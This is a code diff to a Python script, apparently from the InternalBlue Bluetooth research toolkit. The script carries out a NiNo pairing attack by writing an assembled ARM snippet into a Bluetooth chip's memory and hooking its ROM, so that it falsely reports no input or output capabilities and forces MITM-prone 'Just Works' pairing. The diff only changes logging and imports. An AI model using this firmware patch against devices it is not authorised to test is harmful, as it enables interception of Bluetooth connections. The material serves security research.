@@ -6,8 +6,7 @@ import sys
 
 from internalblue import Address
 from internalblue.adbcore import ADBCore
-from internalblue.utils.pwnlib_wrapper import log, asm
-
+from pwnlib.asm import asm
 
 """
 In a NiNo attack an active MITM fakes that the other device has no in put and no output capabilities. We think smartphones should not accept that or show a big warning ("Is this really a headset without display?!"), but in implementations we saw this does not happen. With NiNo, secure simple pairing will still be present, but in "Just Works" mode which is suspect to MITM.
@@ -71,29 +70,28 @@ internalblue.interface = internalblue.device_list()[0][1] # just use the first d
 
 # setup sockets
 if not internalblue.connect():
-    log.critical("No connection to target device.")
+    internalblue.logger.critical("No connection to target device.")
     exit(-1)
 
 
-
-progress_log = log.info("Writing ASM snippet for NiNo check.")
+internalblue.logger.info("Writing ASM snippet for NiNo check.")
 code = asm(ASM_SNIPPET_IO_CAP_RESP, vma=ASM_LOCATION_IO_CAP_RESP)
-if not internalblue.writeMem(address=ASM_LOCATION_IO_CAP_RESP, data=code, progress_log=progress_log):
-    progress_log.critical("error!")
+if not internalblue.writeMem(address=ASM_LOCATION_IO_CAP_RESP, data=code, progress_log=None):
+    internalblue.logger.failure("error!")
     exit(-1)
     
 
 # all send_lmp functions are in rom...
-log.info("Installing NiNo hook ...")
+internalblue.logger.info("Installing NiNo hook ...")
 patch = asm("b 0x%x" % ASM_LOCATION_IO_CAP_RESP, vma=HOOK_IO_CAP_RESP)
 if not internalblue.patchRom(HOOK_IO_CAP_RESP, patch):
-    log.critical("error!")
+    internalblue.logger.critical("error!")
     exit(-1)
 
 
 
 # shutdown connection
 internalblue.shutdown()
-log.info("Goodbye")
+internalblue.logger.info("Goodbye")
 
 
